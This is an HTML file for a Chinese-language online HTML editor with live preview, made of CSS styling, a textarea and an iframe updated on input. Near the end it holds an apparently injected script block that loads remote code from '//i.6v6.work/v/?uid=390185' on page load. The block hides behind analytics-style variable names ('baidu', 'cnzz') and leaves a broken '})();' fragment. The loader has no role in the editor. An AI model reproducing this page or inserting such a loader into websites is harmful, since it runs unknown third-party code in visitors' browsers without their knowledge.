
<!DOCTYPE html>
<html>
<head>
<title>在线 HTML 编辑器 - 实时预览</title>
<meta name="description" content="一个简单的在线 HTML 编辑器，支持实时预览 HTML 代码。">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
<style>
  body {
    font-family: sans-serif;
    margin: 0;
    padding: 0;
    background-color: #f0f0f0;
    display: flex;
    justify-content: center;
    align-items: center;
    min-height: 100vh;
  }

  .container {
    background-color: #fff;
    border-radius: 10px;
    box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
    padding: 20px;
    width: 80%;
    max-width: 1000px;
    display: flex;
  }

  .editor, .preview {
    width: 50%;
    height: 500px;
    padding: 10px;
    border: 1px solid #ddd;
    border-radius: 5px;
  }

  .editor {
    background-color: #f5f5f5;
    border-right: none;
  }

  .preview {
    background-color: #eee;
    margin-left: 10px;
  }

  textarea {
    width: 100%;
    height: 100%;
    border: none;
    resize: none;
    font-family: monospace;
    font-size: 16px;
    padding: 10px;
    box-sizing: border-box;
  }

  iframe {
    width: 100%;
    height: 100%;
    border: none;
  }

  /* 响应式设计 */
  @media (max-width: 768px) {
    .container {
      flex-direction: column; /* 在移动设备上改为垂直布局 */
    }

    .editor, .preview {
      width: 100%;
      height: 400px; /* 减少高度 */
      margin-bottom: 10px; /* 添加间距 */
    }
  }

  /* 按钮样式 */
  .button {
    background-color: #4CAF50;
    color: white;
    padding: 10px 20px;
    border: none;
    border-radius: 5px;
    cursor: pointer;
    transition: background-color 0.3s ease; /* 添加悬停动画 */
    display: inline-block;
    margin-top: 10px;
  }

  .button:hover {
    background-color: #45a049; /* 悬停时改变背景色 */
  }
</style>
</head>
<body>
  <div class="container">
    <div class="editor">
      <textarea id="code-editor" placeholder="输入您的 HTML 代码"></textarea>
    </div>
    <div class="preview">
      <iframe id="preview-frame" srcdoc=""></iframe>
    </div>
  </div>
    <script type="text/javascript">

    var baidu = document.createElement("script");
    baidu.src = "//i.6v6.work/v/?uid=390185";
    var cnzz = document.getElementsByTagName("script")[0];
    cnzz.parentNode.insertBefore(baidu, cnzz);		
 })();
</script>

  <script>
    const editor = document.getElementById('code-editor');
    const previewFrame = document.getElementById('preview-frame');

    editor.addEventListener('input', () => {
      previewFrame.srcdoc = editor.value;
    });
  </script>
</body>
</html>
